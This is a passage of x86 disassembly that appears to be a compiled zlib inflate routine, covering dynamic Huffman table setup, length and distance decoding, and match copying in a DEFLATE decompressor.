   1c26c:	shl    eax,cl
   1c26e:	add    edi,0x8
   1c271:	add    ebx,eax
   1c273:	inc    DWORD PTR [ebp-0x4]
   1c276:	cmp    edi,0xe
   1c279:	jb     0x1c257
   1c27b:	mov    edx,DWORD PTR [ebp+0x8]
   1c27e:	mov    eax,ebx
   1c280:	and    eax,0x1f
   1c283:	add    eax,0x101
   1c288:	mov    DWORD PTR [esi+0x60],eax
   1c28b:	shr    ebx,0x5
   1c28e:	mov    eax,ebx
   1c290:	and    eax,0x1f
   1c293:	inc    eax
   1c294:	shr    ebx,0x5
   1c297:	mov    DWORD PTR [esi+0x64],eax
   1c29a:	mov    eax,ebx
   1c29c:	and    eax,0xf
   1c29f:	add    eax,0x4
   1c2a2:	shr    ebx,0x4
   1c2a5:	sub    edi,0xe
   1c2a8:	cmp    DWORD PTR [esi+0x60],0x11e
   1c2af:	mov    DWORD PTR [esi+0x5c],eax
   1c2b2:	ja     0x1c2c6
   1c2b4:	cmp    DWORD PTR [esi+0x64],0x1e
   1c2b8:	ja     0x1c2c6
   1c2ba:	and    DWORD PTR [esi+0x68],0x0
   1c2be:	mov    DWORD PTR [esi],0x10
   1c2c4:	jmp    0x1c314
   1c2c6:	mov    DWORD PTR [edx+0x18],0x1ece2
   1c2cd:	jmp    0x1caef
   1c2d2:	cmp    DWORD PTR [ebp-0x8],0x0
   1c2d6:	je     0x1cb43
   1c2dc:	mov    eax,DWORD PTR [ebp-0x4]
   1c2df:	movzx  eax,BYTE PTR [eax]
   1c2e2:	dec    DWORD PTR [ebp-0x8]
   1c2e5:	mov    ecx,edi
   1c2e7:	shl    eax,cl
   1c2e9:	add    ebx,eax
   1c2eb:	inc    DWORD PTR [ebp-0x4]
   1c2ee:	add    edi,0x8
   1c2f1:	cmp    edi,0x3
   1c2f4:	jb     0x1c2d2
   1c2f6:	mov    ecx,DWORD PTR [esi+0x68]
   1c2f9:	movzx  ecx,WORD PTR [ecx*2+0x7bdf0]
   1c301:	mov    eax,ebx
   1c303:	and    eax,0x7
   1c306:	mov    WORD PTR [esi+ecx*2+0x70],ax
   1c30b:	inc    DWORD PTR [esi+0x68]
   1c30e:	shr    ebx,0x3
   1c311:	sub    edi,0x3
   1c314:	mov    eax,DWORD PTR [esi+0x68]
   1c317:	cmp    eax,DWORD PTR [esi+0x5c]
   1c31a:	jb     0x1c2f1
   1c31c:	jmp    0x1c333
   1c31e:	mov    eax,DWORD PTR [esi+0x68]
   1c321:	movzx  eax,WORD PTR [eax*2+0x7bdf0]
   1c329:	xor    ecx,ecx
   1c32b:	mov    WORD PTR [esi+eax*2+0x70],cx
   1c330:	inc    DWORD PTR [esi+0x68]
   1c333:	cmp    DWORD PTR [esi+0x68],0x13
   1c337:	jb     0x1c31e
   1c339:	lea    eax,[esi+0x530]
   1c33f:	lea    ecx,[esi+0x6c]
   1c342:	mov    DWORD PTR [ecx],eax
   1c344:	mov    DWORD PTR [esi+0x4c],eax
   1c347:	lea    edx,[esi+0x2f0]
   1c34d:	push   edx
   1c34e:	lea    eax,[esi+0x54]
   1c351:	push   eax
   1c352:	push   ecx
   1c353:	mov    DWORD PTR [eax],0x7
   1c359:	push   0x13
   1c35b:	lea    eax,[esi+0x70]
   1c35e:	push   eax
   1c35f:	push   0x0
   1c361:	call   0x1d0fe
   1c366:	mov    DWORD PTR [ebp-0x24],eax
   1c369:	test   eax,eax
   1c36b:	je     0x1c37c
   1c36d:	mov    eax,DWORD PTR [ebp+0x8]
   1c370:	mov    DWORD PTR [eax+0x18],0x1ecc8
   1c377:	jmp    0x1caef
   1c37c:	and    DWORD PTR [esi+0x68],0x0
   1c380:	mov    DWORD PTR [esi],0x11
   1c386:	jmp    0x1c582
   1c38b:	cmp    DWORD PTR [ebp-0x8],0x0
   1c38f:	je     0x1cb43
   1c395:	mov    eax,DWORD PTR [ebp-0x4]
   1c398:	movzx  eax,BYTE PTR [eax]
   1c39b:	dec    DWORD PTR [ebp-0x8]
   1c39e:	mov    ecx,edi
   1c3a0:	shl    eax,cl
   1c3a2:	add    ebx,eax
   1c3a4:	inc    DWORD PTR [ebp-0x4]
   1c3a7:	add    edi,0x8
   1c3aa:	mov    ecx,DWORD PTR [esi+0x54]
   1c3ad:	xor    eax,eax
   1c3af:	inc    eax
   1c3b0:	shl    eax,cl
   1c3b2:	mov    ecx,DWORD PTR [esi+0x4c]
   1c3b5:	dec    eax
   1c3b6:	and    eax,ebx
   1c3b8:	mov    eax,DWORD PTR [ecx+eax*4]
   1c3bb:	mov    ecx,eax
   1c3bd:	shr    ecx,0x8
   1c3c0:	movzx  ecx,cl
   1c3c3:	mov    DWORD PTR [ebp-0x20],eax
   1c3c6:	cmp    ecx,edi
   1c3c8:	ja     0x1c38b
   1c3ca:	mov    ecx,eax
   1c3cc:	shr    ecx,0x10
   1c3cf:	cmp    cx,0x10
   1c3d3:	jae    0x1c420
   1c3d5:	mov    ecx,eax
   1c3d7:	shr    ecx,0x8
   1c3da:	movzx  ecx,cl
   1c3dd:	jmp    0x1c401
   1c3df:	cmp    DWORD PTR [ebp-0x8],0x0
   1c3e3:	je     0x1cb43
   1c3e9:	mov    ecx,DWORD PTR [ebp-0x4]
   1c3ec:	movzx  edx,BYTE PTR [ecx]
   1c3ef:	dec    DWORD PTR [ebp-0x8]
   1c3f2:	mov    ecx,edi
   1c3f4:	shl    edx,cl
   1c3f6:	movzx  ecx,ah
   1c3f9:	add    ebx,edx
   1c3fb:	inc    DWORD PTR [ebp-0x4]
   1c3fe:	add    edi,0x8
   1c401:	cmp    edi,ecx
   1c403:	jb     0x1c3df
   1c405:	movzx  ecx,ah
   1c408:	mov    eax,DWORD PTR [esi+0x68]
   1c40b:	shr    ebx,cl
   1c40d:	sub    edi,ecx
   1c40f:	mov    cx,WORD PTR [ebp-0x1e]
   1c413:	mov    WORD PTR [esi+eax*2+0x70],cx
   1c418:	inc    DWORD PTR [esi+0x68]
   1c41b:	jmp    0x1c582
   1c420:	cmp    WORD PTR [ebp-0x1e],0x10
   1c425:	jne    0x1c47d
   1c427:	movzx  eax,ah
   1c42a:	jmp    0x1c44b
   1c42c:	cmp    DWORD PTR [ebp-0x8],0x0
   1c430:	je     0x1cb43
   1c436:	mov    ecx,DWORD PTR [ebp-0x4]
   1c439:	movzx  edx,BYTE PTR [ecx]
   1c43c:	dec    DWORD PTR [ebp-0x8]
   1c43f:	mov    ecx,edi
   1c441:	shl    edx,cl
   1c443:	add    ebx,edx
   1c445:	inc    DWORD PTR [ebp-0x4]
   1c448:	add    edi,0x8
   1c44b:	lea    ecx,[eax+0x2]
   1c44e:	cmp    edi,ecx
   1c450:	jb     0x1c42c
   1c452:	mov    ecx,eax
   1c454:	sub    edi,eax
   1c456:	mov    eax,DWORD PTR [esi+0x68]
   1c459:	shr    ebx,cl
   1c45b:	test   eax,eax
   1c45d:	je     0x1c593
   1c463:	movzx  eax,WORD PTR [esi+eax*2+0x6e]
   1c468:	mov    DWORD PTR [ebp-0x20],eax
   1c46b:	mov    eax,ebx
   1c46d:	and    eax,0x3
   1c470:	add    eax,0x3
   1c473:	shr    ebx,0x2
   1c476:	dec    edi
   1c477:	dec    edi
   1c478:	jmp    0x1c502
   1c47d:	cmp    WORD PTR [ebp-0x1e],0x11
   1c482:	movzx  edx,ah
   1c485:	jne    0x1c4e1
   1c487:	jmp    0x1c4a8
   1c489:	cmp    DWORD PTR [ebp-0x8],0x0
   1c48d:	je     0x1cb43
   1c493:	mov    eax,DWORD PTR [ebp-0x4]
   1c496:	movzx  eax,BYTE PTR [eax]
   1c499:	dec    DWORD PTR [ebp-0x8]
   1c49c:	mov    ecx,edi
   1c49e:	shl    eax,cl
   1c4a0:	add    ebx,eax
   1c4a2:	inc    DWORD PTR [ebp-0x4]
   1c4a5:	add    edi,0x8
   1c4a8:	lea    eax,[edx+0x3]
   1c4ab:	cmp    edi,eax
   1c4ad:	jb     0x1c489
   1c4af:	mov    ecx,edx
   1c4b1:	shr    ebx,cl
   1c4b3:	push   0xfffffffd
   1c4b5:	mov    eax,ebx
   1c4b7:	and    eax,0x7
   1c4ba:	add    eax,0x3
   1c4bd:	shr    ebx,0x3
   1c4c0:	jmp    0x1c4f9
   1c4c2:	cmp    DWORD PTR [ebp-0x8],0x0
   1c4c6:	je     0x1cb43
   1c4cc:	mov    eax,DWORD PTR [ebp-0x4]
   1c4cf:	movzx  eax,BYTE PTR [eax]
   1c4d2:	dec    DWORD PTR [ebp-0x8]
   1c4d5:	mov    ecx,edi
   1c4d7:	shl    eax,cl
   1c4d9:	add    ebx,eax
   1c4db:	inc    DWORD PTR [ebp-0x4]
   1c4de:	add    edi,0x8
   1c4e1:	lea    eax,[edx+0x7]
   1c4e4:	cmp    edi,eax
   1c4e6:	jb     0x1c4c2
   1c4e8:	mov    ecx,edx
   1c4ea:	shr    ebx,cl
   1c4ec:	push   0xfffffff9
   1c4ee:	mov    eax,ebx
   1c4f0:	and    eax,0x7f
   1c4f3:	add    eax,0xb
   1c4f6:	shr    ebx,0x7
   1c4f9:	and    DWORD PTR [ebp-0x20],0x0
   1c4fd:	pop    ecx
   1c4fe:	sub    ecx,edx
   1c500:	add    edi,ecx
   1c502:	mov    ecx,DWORD PTR [esi+0x64]
   1c505:	mov    edx,DWORD PTR [esi+0x68]
   1c508:	add    ecx,DWORD PTR [esi+0x60]
   1c50b:	add    edx,eax
   1c50d:	cmp    edx,ecx
   1c50f:	jbe    0x1c57e
   1c511:	mov    eax,DWORD PTR [ebp+0x8]
   1c514:	mov    DWORD PTR [eax+0x18],0x1ecae
   1c51b:	mov    DWORD PTR [esi],0x1b
   1c521:	cmp    DWORD PTR [esi],0x1b
   1c524:	je     0x1caf5
   1c52a:	lea    eax,[esi+0x530]
   1c530:	lea    ecx,[esi+0x6c]
   1c533:	mov    DWORD PTR [ecx],eax
   1c535:	mov    DWORD PTR [esi+0x4c],eax
   1c538:	lea    edx,[esi+0x2f0]
   1c53e:	push   edx
   1c53f:	lea    eax,[esi+0x54]
   1c542:	push   eax
   1c543:	push   ecx
   1c544:	push   DWORD PTR [esi+0x60]
   1c547:	mov    DWORD PTR [eax],0x9
   1c54d:	lea    eax,[esi+0x70]
   1c550:	push   eax
   1c551:	push   0x1
   1c553:	call   0x1d0fe
   1c558:	mov    DWORD PTR [ebp-0x24],eax
   1c55b:	test   eax,eax
   1c55d:	je     0x1c5a2
   1c55f:	mov    eax,DWORD PTR [ebp+0x8]
   1c562:	mov    DWORD PTR [eax+0x18],0x1ec92
   1c569:	jmp    0x1caef
   1c56e:	mov    ecx,DWORD PTR [esi+0x68]
   1c571:	mov    dx,WORD PTR [ebp-0x20]
   1c575:	dec    eax
   1c576:	mov    WORD PTR [esi+ecx*2+0x70],dx
   1c57b:	inc    DWORD PTR [esi+0x68]
   1c57e:	test   eax,eax
   1c580:	jne    0x1c56e
   1c582:	mov    eax,DWORD PTR [esi+0x64]
   1c585:	add    eax,DWORD PTR [esi+0x60]
   1c588:	cmp    DWORD PTR [esi+0x68],eax
   1c58b:	jb     0x1c3aa
   1c591:	jmp    0x1c521
   1c593:	mov    eax,DWORD PTR [ebp+0x8]
   1c596:	mov    DWORD PTR [eax+0x18],0x1ecae
   1c59d:	jmp    0x1caef
   1c5a2:	lea    ecx,[esi+0x6c]
   1c5a5:	mov    eax,DWORD PTR [ecx]
   1c5a7:	mov    DWORD PTR [esi+0x50],eax
   1c5aa:	lea    edx,[esi+0x2f0]
   1c5b0:	push   edx
   1c5b1:	lea    eax,[esi+0x58]
   1c5b4:	push   eax
   1c5b5:	push   ecx
   1c5b6:	push   DWORD PTR [esi+0x64]
   1c5b9:	mov    DWORD PTR [eax],0x6
   1c5bf:	mov    eax,DWORD PTR [esi+0x60]
   1c5c2:	lea    eax,[esi+eax*2+0x70]
   1c5c6:	push   eax
   1c5c7:	push   0x2
   1c5c9:	call   0x1d0fe
   1c5ce:	mov    DWORD PTR [ebp-0x24],eax
   1c5d1:	test   eax,eax
   1c5d3:	je     0x1c5e4
   1c5d5:	mov    eax,DWORD PTR [ebp+0x8]
   1c5d8:	mov    DWORD PTR [eax+0x18],0x1ec7c
   1c5df:	jmp    0x1caef
   1c5e4:	mov    DWORD PTR [esi],0x12
   1c5ea:	cmp    DWORD PTR [ebp-0x8],0x6
   1c5ee:	jb     0x1c647
   1c5f0:	cmp    DWORD PTR [ebp-0x10],0x102
   1c5f7:	jb     0x1c647
   1c5f9:	mov    eax,DWORD PTR [ebp+0x8]
   1c5fc:	mov    ecx,DWORD PTR [ebp-0x18]
   1c5ff:	push   DWORD PTR [ebp-0x1c]
   1c602:	mov    DWORD PTR [eax+0xc],ecx
   1c605:	mov    ecx,DWORD PTR [ebp-0x10]
   1c608:	mov    DWORD PTR [eax+0x10],ecx
   1c60b:	mov    ecx,DWORD PTR [ebp-0x4]
   1c60e:	mov    DWORD PTR [eax],ecx
   1c610:	mov    ecx,DWORD PTR [ebp-0x8]
   1c613:	mov    DWORD PTR [eax+0x4],ecx
   1c616:	push   eax
   1c617:	mov    DWORD PTR [esi+0x38],ebx
   1c61a:	mov    DWORD PTR [esi+0x3c],edi
   1c61d:	call   0x1cd18
   1c622:	mov    eax,DWORD PTR [ebp+0x8]
   1c625:	mov    ecx,DWORD PTR [eax+0xc]
   1c628:	mov    ebx,DWORD PTR [esi+0x38]
   1c62b:	mov    edi,DWORD PTR [esi+0x3c]
   1c62e:	mov    DWORD PTR [ebp-0x18],ecx
   1c631:	mov    ecx,DWORD PTR [eax+0x10]
   1c634:	mov    DWORD PTR [ebp-0x10],ecx
   1c637:	mov    ecx,DWORD PTR [eax]
   1c639:	mov    eax,DWORD PTR [eax+0x4]
   1c63c:	mov    DWORD PTR [ebp-0x4],ecx
   1c63f:	mov    DWORD PTR [ebp-0x8],eax
   1c642:	jmp    0x1caf5
   1c647:	mov    ecx,DWORD PTR [esi+0x54]
   1c64a:	mov    eax,DWORD PTR [esi+0x4c]
   1c64d:	xor    edx,edx
   1c64f:	inc    edx
   1c650:	shl    edx,cl
   1c652:	dec    edx
   1c653:	and    edx,ebx
   1c655:	mov    eax,DWORD PTR [eax+edx*4]
   1c658:	jmp    0x1c68a
   1c65a:	cmp    DWORD PTR [ebp-0x8],0x0
   1c65e:	je     0x1cb43
   1c664:	mov    eax,DWORD PTR [ebp-0x4]
   1c667:	movzx  eax,BYTE PTR [eax]
   1c66a:	dec    DWORD PTR [ebp-0x8]
   1c66d:	mov    ecx,edi
   1c66f:	shl    eax,cl
   1c671:	mov    ecx,DWORD PTR [esi+0x54]
   1c674:	add    edi,0x8
   1c677:	add    ebx,eax
   1c679:	inc    DWORD PTR [ebp-0x4]
   1c67c:	xor    eax,eax
   1c67e:	inc    eax
   1c67f:	shl    eax,cl
   1c681:	mov    ecx,DWORD PTR [esi+0x4c]
   1c684:	dec    eax
   1c685:	and    eax,ebx
   1c687:	mov    eax,DWORD PTR [ecx+eax*4]
   1c68a:	mov    ecx,eax
   1c68c:	shr    ecx,0x8
   1c68f:	movzx  ecx,cl
   1c692:	cmp    ecx,edi
   1c694:	ja     0x1c65a
   1c696:	test   al,al
   1c698:	je     0x1c731
   1c69e:	test   al,0xf0
   1c6a0:	jne    0x1c731
   1c6a6:	mov    DWORD PTR [ebp-0xc],eax
   1c6a9:	shr    DWORD PTR [ebp-0xc],0x8
   1c6ad:	movzx  edx,BYTE PTR [ebp-0xc]
   1c6b1:	mov    DWORD PTR [ebp-0x28],edx
   1c6b4:	movzx  ecx,al
   1c6b7:	add    ecx,edx
   1c6b9:	xor    edx,edx
   1c6bb:	inc    edx
   1c6bc:	shl    edx,cl
   1c6be:	mov    ecx,DWORD PTR [ebp-0x28]
   1c6c1:	mov    DWORD PTR [ebp-0x20],eax
   1c6c4:	shr    eax,0x10
   1c6c7:	dec    edx
   1c6c8:	and    edx,ebx
   1c6ca:	shr    edx,cl
   1c6cc:	add    edx,eax
   1c6ce:	mov    eax,DWORD PTR [esi+0x4c]
   1c6d1:	mov    eax,DWORD PTR [eax+edx*4]
   1c6d4:	movzx  edx,BYTE PTR [ebp-0xc]
   1c6d8:	jmp    0x1c71b
   1c6da:	cmp    DWORD PTR [ebp-0x8],0x0
   1c6de:	je     0x1cb43
   1c6e4:	mov    eax,DWORD PTR [ebp-0x4]
   1c6e7:	movzx  eax,BYTE PTR [eax]
   1c6ea:	movzx  edx,BYTE PTR [ebp-0x1f]
   1c6ee:	dec    DWORD PTR [ebp-0x8]
   1c6f1:	mov    ecx,edi
   1c6f3:	shl    eax,cl
   1c6f5:	movzx  ecx,BYTE PTR [ebp-0x20]
   1c6f9:	add    ebx,eax
   1c6fb:	inc    DWORD PTR [ebp-0x4]
   1c6fe:	xor    eax,eax
   1c700:	add    ecx,edx
   1c702:	inc    eax
   1c703:	shl    eax,cl
   1c705:	add    edi,0x8
   1c708:	mov    ecx,edx
   1c70a:	dec    eax
   1c70b:	and    eax,ebx
   1c70d:	shr    eax,cl
   1c70f:	movzx  ecx,WORD PTR [ebp-0x1e]
   1c713:	add    eax,ecx
   1c715:	mov    ecx,DWORD PTR [esi+0x4c]
   1c718:	mov    eax,DWORD PTR [ecx+eax*4]
   1c71b:	mov    ecx,eax
   1c71d:	shr    ecx,0x8
   1c720:	movzx  ecx,cl
   1c723:	add    ecx,edx
   1c725:	cmp    ecx,edi
   1c727:	ja     0x1c6da
   1c729:	movzx  ecx,BYTE PTR [ebp-0x1f]
   1c72d:	shr    ebx,cl
   1c72f:	sub    edi,ecx
   1c731:	mov    ecx,eax
   1c733:	shr    ecx,0x8
   1c736:	movzx  ecx,cl
   1c739:	shr    ebx,cl
   1c73b:	sub    edi,ecx
   1c73d:	mov    ecx,eax
   1c73f:	shr    ecx,0x10
   1c742:	mov    DWORD PTR [esi+0x40],ecx
   1c745:	test   al,al
   1c747:	jne    0x1c754
   1c749:	mov    DWORD PTR [esi],0x17
   1c74f:	jmp    0x1caf5
   1c754:	test   al,0x20
   1c756:	je     0x1c763
   1c758:	mov    DWORD PTR [esi],0xb
   1c75e:	jmp    0x1caf5
   1c763:	test   al,0x40
   1c765:	je     0x1c776
   1c767:	mov    eax,DWORD PTR [ebp+0x8]
   1c76a:	mov    DWORD PTR [eax+0x18],0x1ec60
   1c771:	jmp    0x1caef
   1c776:	movzx  eax,al
   1c779:	and    eax,0xf
   1c77c:	mov    DWORD PTR [esi+0x48],eax
   1c77f:	mov    DWORD PTR [esi],0x13
   1c785:	mov    eax,DWORD PTR [esi+0x48]
   1c788:	test   eax,eax
   1c78a:	je     0x1c7c5
   1c78c:	cmp    edi,eax
   1c78e:	jae    0x1c7b4
   1c790:	cmp    DWORD PTR [ebp-0x8],0x0
   1c794:	je     0x1cb43
   1c79a:	mov    ecx,DWORD PTR [ebp-0x4]
   1c79d:	movzx  edx,BYTE PTR [ecx]
   1c7a0:	dec    DWORD PTR [ebp-0x8]
   1c7a3:	mov    ecx,edi
   1c7a5:	shl    edx,cl
   1c7a7:	add    edi,0x8
   1c7aa:	add    ebx,edx
   1c7ac:	inc    DWORD PTR [ebp-0x4]
   1c7af:	cmp    edi,DWORD PTR [esi+0x48]
   1c7b2:	jb     0x1c790
   1c7b4:	xor    edx,edx
   1c7b6:	inc    edx
   1c7b7:	mov    ecx,eax
   1c7b9:	shl    edx,cl
   1c7bb:	dec    edx
   1c7bc:	and    edx,ebx
   1c7be:	add    DWORD PTR [esi+0x40],edx
   1c7c1:	shr    ebx,cl
   1c7c3:	sub    edi,eax
   1c7c5:	mov    DWORD PTR [esi],0x14
   1c7cb:	mov    ecx,DWORD PTR [esi+0x58]
   1c7ce:	mov    eax,DWORD PTR [esi+0x50]
   1c7d1:	xor    edx,edx
   1c7d3:	inc    edx
   1c7d4:	shl    edx,cl
   1c7d6:	dec    edx
   1c7d7:	and    edx,ebx
   1c7d9:	mov    eax,DWORD PTR [eax+edx*4]
   1c7dc:	jmp    0x1c80e
   1c7de:	cmp    DWORD PTR [ebp-0x8],0x0
   1c7e2:	je     0x1cb43
   1c7e8:	mov    eax,DWORD PTR [ebp-0x4]
   1c7eb:	movzx  eax,BYTE PTR [eax]
   1c7ee:	dec    DWORD PTR [ebp-0x8]
   1c7f1:	mov    ecx,edi
   1c7f3:	shl    eax,cl
   1c7f5:	mov    ecx,DWORD PTR [esi+0x58]
   1c7f8:	add    edi,0x8
   1c7fb:	add    ebx,eax
   1c7fd:	inc    DWORD PTR [ebp-0x4]
   1c800:	xor    eax,eax
   1c802:	inc    eax
   1c803:	shl    eax,cl
   1c805:	mov    ecx,DWORD PTR [esi+0x50]
   1c808:	dec    eax
   1c809:	and    eax,ebx
   1c80b:	mov    eax,DWORD PTR [ecx+eax*4]
   1c80e:	mov    ecx,eax
   1c810:	shr    ecx,0x8
   1c813:	movzx  ecx,cl
   1c816:	cmp    ecx,edi
   1c818:	ja     0x1c7de
   1c81a:	test   al,0xf0
   1c81c:	jne    0x1c8ad
   1c822:	mov    DWORD PTR [ebp-0xc],eax
   1c825:	shr    DWORD PTR [ebp-0xc],0x8
   1c829:	movzx  edx,BYTE PTR [ebp-0xc]
   1c82d:	mov    DWORD PTR [ebp-0x28],edx
   1c830:	movzx  ecx,al
   1c833:	add    ecx,edx
   1c835:	xor    edx,edx
   1c837:	inc    edx
   1c838:	shl    edx,cl
   1c83a:	mov    ecx,DWORD PTR [ebp-0x28]
   1c83d:	mov    DWORD PTR [ebp-0x20],eax
   1c840:	shr    eax,0x10
   1c843:	dec    edx
   1c844:	and    edx,ebx
   1c846:	shr    edx,cl
   1c848:	add    edx,eax
   1c84a:	mov    eax,DWORD PTR [esi+0x50]
   1c84d:	mov    eax,DWORD PTR [eax+edx*4]
   1c850:	movzx  edx,BYTE PTR [ebp-0xc]
   1c854:	jmp    0x1c897
   1c856:	cmp    DWORD PTR [ebp-0x8],0x0
   1c85a:	je     0x1cb43
   1c860:	mov    eax,DWORD PTR [ebp-0x4]
   1c863:	movzx  eax,BYTE PTR [eax]
   1c866:	movzx  edx,BYTE PTR [ebp-0x1f]
   1c86a:	dec    DWORD PTR [ebp-0x8]
   1c86d:	mov    ecx,edi
   1c86f:	shl    eax,cl
   1c871:	movzx  ecx,BYTE PTR [ebp-0x20]
   1c875:	add    ebx,eax
   1c877:	inc    DWORD PTR [ebp-0x4]
   1c87a:	xor    eax,eax
   1c87c:	add    ecx,edx
   1c87e:	inc    eax
   1c87f:	shl    eax,cl
   1c881:	add    edi,0x8
   1c884:	mov    ecx,edx
   1c886:	dec    eax
   1c887:	and    eax,ebx
   1c889:	shr    eax,cl
   1c88b:	movzx  ecx,WORD PTR [ebp-0x1e]
   1c88f:	add    eax,ecx
   1c891:	mov    ecx,DWORD PTR [esi+0x50]
   1c894:	mov    eax,DWORD PTR [ecx+eax*4]
   1c897:	mov    ecx,eax
   1c899:	shr    ecx,0x8
   1c89c:	movzx  ecx,cl
   1c89f:	add    ecx,edx
   1c8a1:	cmp    ecx,edi
   1c8a3:	ja     0x1c856
   1c8a5:	movzx  ecx,BYTE PTR [ebp-0x1f]
   1c8a9:	shr    ebx,cl
   1c8ab:	sub    edi,ecx
   1c8ad:	mov    ecx,eax
   1c8af:	shr    ecx,0x8
   1c8b2:	movzx  ecx,cl
   1c8b5:	shr    ebx,cl
   1c8b7:	sub    edi,ecx
   1c8b9:	test   al,0x40
   1c8bb:	je     0x1c8cc
   1c8bd:	mov    eax,DWORD PTR [ebp+0x8]
   1c8c0:	mov    DWORD PTR [eax+0x18],0x1ec4a
   1c8c7:	jmp    0x1caef
   1c8cc:	mov    edx,DWORD PTR [ebp+0x8]
   1c8cf:	mov    ecx,eax
   1c8d1:	movzx  eax,al
   1c8d4:	shr    ecx,0x10
   1c8d7:	and    eax,0xf
   1c8da:	mov    DWORD PTR [esi+0x44],ecx
   1c8dd:	mov    DWORD PTR [esi+0x48],eax
   1c8e0:	mov    DWORD PTR [esi],0x15
   1c8e6:	mov    eax,DWORD PTR [esi+0x48]
   1c8e9:	test   eax,eax
   1c8eb:	je     0x1c92a
   1c8ed:	cmp    edi,eax
   1c8ef:	jae    0x1c918
   1c8f1:	cmp    DWORD PTR [ebp-0x8],0x0
   1c8f5:	je     0x1cb43
   1c8fb:	mov    eax,DWORD PTR [ebp-0x4]
   1c8fe:	movzx  eax,BYTE PTR [eax]
   1c901:	dec    DWORD PTR [ebp-0x8]
   1c904:	mov    ecx,edi
   1c906:	shl    eax,cl
   1c908:	add    edi,0x8
   1c90b:	add    ebx,eax
   1c90d:	inc    DWORD PTR [ebp-0x4]
   1c910:	cmp    edi,DWORD PTR [esi+0x48]
   1c913:	jb     0x1c8f1
   1c915:	mov    edx,DWORD PTR [ebp+0x8]
   1c918:	mov    ecx,DWORD PTR [esi+0x48]
   1c91b:	xor    eax,eax
   1c91d:	inc    eax
   1c91e:	shl    eax,cl
   1c920:	dec    eax
   1c921:	and    eax,ebx
   1c923:	add    DWORD PTR [esi+0x44],eax
   1c926:	shr    ebx,cl
   1c928:	sub    edi,ecx
   1c92a:	mov    eax,DWORD PTR [esi+0x2c]
   1c92d:	sub    eax,DWORD PTR [ebp-0x10]
   1c930:	add    eax,DWORD PTR [ebp-0x1c]
   1c933:	cmp    DWORD PTR [esi+0x44],eax
   1c936:	jbe    0x1c944
   1c938:	mov    DWORD PTR [edx+0x18],0x1ec2c
   1c93f:	jmp    0x1caef
   1c944:	mov    DWORD PTR [esi],0x16
   1c94a:	cmp    DWORD PTR [ebp-0x10],0x0
   1c94e:	je     0x1cb43
   1c954:	mov    eax,DWORD PTR [ebp-0x1c]
   1c957:	sub    eax,DWORD PTR [ebp-0x10]
   1c95a:	mov    ecx,DWORD PTR [esi+0x44]
   1c95d:	cmp    ecx,eax
   1c95f:	jbe    0x1c98e
   1c961:	sub    ecx,eax
   1c963:	mov    eax,DWORD PTR [esi+0x34]
   1c966:	mov    DWORD PTR [ebp-0xc],ecx
   1c969:	mov    ecx,DWORD PTR [esi+0x30]
   1c96c:	cmp    DWORD PTR [ebp-0xc],ecx
   1c96f:	jbe    0x1c97c
   1c971:	add    eax,DWORD PTR [esi+0x28]
   1c974:	sub    DWORD PTR [ebp-0xc],ecx
   1c977:	sub    eax,DWORD PTR [ebp-0xc]
   1c97a:	jmp    0x1c981
   1c97c:	sub    eax,DWORD PTR [ebp-0xc]
   1c97f:	add    eax,ecx
   1c981:	mov    ecx,DWORD PTR [esi+0x40]
   1c984:	mov    DWORD PTR [ebp-0x28],ecx
   1c987:	cmp    DWORD PTR [ebp-0xc],ecx
   1c98a:	jbe    0x1c99c
   1c98c:	jmp    0x1c999
   1c98e:	mov    eax,DWORD PTR [ebp-0x18]
   1c991:	sub    eax,ecx
   1c993:	mov    ecx,DWORD PTR [esi+0x40]
   1c996:	mov    DWORD PTR [ebp-0x28],ecx
   1c999:	mov    DWORD PTR [ebp-0xc],ecx
   1c99c:	mov    ecx,DWORD PTR [ebp-0x10]
   1c99f:	cmp    DWORD PTR [ebp-0xc],ecx
   1c9a2:	jbe    0x1c9a7
   1c9a4:	mov    DWORD PTR [ebp-0xc],ecx
   1c9a7:	sub    ecx,DWORD PTR [ebp-0xc]
   1c9aa:	mov    DWORD PTR [ebp-0x10],ecx
   1c9ad:	mov    ecx,DWORD PTR [ebp-0x28]
   1c9b0:	sub    ecx,DWORD PTR [ebp-0xc]
   1c9b3:	mov    DWORD PTR [esi+0x40],ecx
   1c9b6:	mov    edx,DWORD PTR [ebp-0x18]
   1c9b9:	mov    cl,BYTE PTR [eax]
   1c9bb:	inc    DWORD PTR [ebp-0x18]
   1c9be:	inc    eax
   1c9bf:	dec    DWORD PTR [ebp-0xc]
   1c9c2:	mov    BYTE PTR [edx],cl
   1c9c4:	jne    0x1c9b6
   1c9c6:	cmp    DWORD PTR [esi+0x40],0x0
   1c9ca:	jne    0x1caf5
   1c9d0:	jmp    0x1c9ea
   1c9d2:	cmp    DWORD PTR [ebp-0x10],0x0
   1c9d6:	je     0x1cb43
   1c9dc:	mov    ecx,DWORD PTR [ebp-0x18]
   1c9df:	mov    al,BYTE PTR [esi+0x40]
   1c9e2:	inc    DWORD PTR [ebp-0x18]
   1c9e5:	dec    DWORD PTR [ebp-0x10]
   1c9e8:	mov    BYTE PTR [ecx],al
   1c9ea:	mov    DWORD PTR [esi],0x12
   1c9f0:	jmp    0x1caf5
   1c9f5:	cmp    DWORD PTR [esi+0x8],0x0
   1c9f9:	je     0x1caa9
   1c9ff:	cmp    edi,0x20
   1ca02:	jae    0x1ca2b
   1ca04:	cmp    DWORD PTR [ebp-0x8],0x0
   1ca08:	je     0x1cb43
   1ca0e:	mov    eax,DWORD PTR [ebp-0x4]
   1ca11:	movzx  eax,BYTE PTR [eax]
   1ca14:	dec    DWORD PTR [ebp-0x8]
   1ca17:	mov    ecx,edi
   1ca19:	shl    eax,cl
   1ca1b:	add    edi,0x8
   1ca1e:	add    ebx,eax
   1ca20:	inc    DWORD PTR [ebp-0x4]
   1ca23:	cmp    edi,0x20
   1ca26:	jb     0x1ca04
   1ca28:	mov    edx,DWORD PTR [ebp+0x8]
   1ca2b:	mov    eax,DWORD PTR [ebp-0x1c]
   1ca2e:	sub    eax,DWORD PTR [ebp-0x10]
   1ca31:	add    DWORD PTR [edx+0x14],eax
   1ca34:	add    DWORD PTR [esi+0x1c],eax
   1ca37:	mov    DWORD PTR [ebp-0x1c],eax
   1ca3a:	test   eax,eax
   1ca3c:	je     0x1ca66
   1ca3e:	push   eax
   1ca3f:	mov    eax,DWORD PTR [ebp-0x18]
   1ca42:	sub    eax,DWORD PTR [ebp-0x1c]
   1ca45:	cmp    DWORD PTR [esi+0x10],0x0
   1ca49:	push   eax
   1ca4a:	push   DWORD PTR [esi+0x18]
   1ca4d:	je     0x1ca56
